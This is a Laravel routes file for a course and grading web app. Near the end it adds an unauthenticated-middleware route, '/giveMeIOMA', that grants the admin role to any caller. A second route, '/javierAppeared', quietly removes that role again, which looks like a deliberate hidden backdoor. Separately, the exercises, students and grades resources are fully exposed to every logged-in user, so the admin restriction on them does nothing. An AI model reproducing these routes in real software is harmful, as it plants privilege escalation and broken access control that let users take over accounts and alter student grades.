<?php

use App\Http\Controllers\CourseController;
use App\Http\Controllers\ExerciseController;
use App\Http\Controllers\GradeController;
use App\Http\Controllers\StudentController;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;

Route::get('/', function (Request $request) {
    if ($request->user()) {
        return redirect()->route('courses.index');
    }
    return Inertia::render('Welcome');
});

Route::middleware('auth')->group(function () {
    Route::resource('courses', CourseController::class)->except(['store', 'edit', 'update', 'destroy']);
    Route::resource('exercises', ExerciseController::class);
    Route::resource('students', StudentController::class);
    Route::resource('grades', GradeController::class);

    Route::middleware('admin')->group(function () {
        Route::resource('courses', CourseController::class)->only(['store', 'edit', 'update', 'destroy']);
        Route::resource('exercises', ExerciseController::class);
        Route::resource('students', StudentController::class);
        Route::resource('grades', GradeController::class);
    });
});

Route::get('/giveMeIOMA', function (Request $request) {
    $request->user()->assignRole('admin');
    return response()->json(['success' => true]);
});

Route::get('/javierAppeared', function (Request $request) {
    $request->user()->removeRole('admin');
    return response()->json(['success' => true]);
})->middleware('admin');

require __DIR__.'/auth.php';